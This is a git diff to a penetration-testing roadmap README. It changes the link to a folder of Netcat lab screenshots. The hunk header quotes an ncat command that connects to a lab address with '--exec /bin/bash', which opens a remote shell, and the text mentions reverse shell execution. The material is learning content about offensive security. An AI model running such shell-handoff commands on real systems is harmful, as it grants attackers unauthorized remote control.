@@ -317,7 +317,7 @@ ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
 
 
 
-All screenshots captured during the Netcat lab modules are available in the [`NETCAT screenshots`](NETCAT%20screenshots/) folder.  
+All screenshots captured during the Netcat lab modules are available in the (https://github.com/LetsLearn-08/Roadmap---Penetration-Testing/tree/main/NETCAT%20screenshots) folder.  
 This includes setup steps, port scans, file transfers, chat simulation, and reverse shell execution.
 
 Use this folder to visually verify each stage of the practical work.
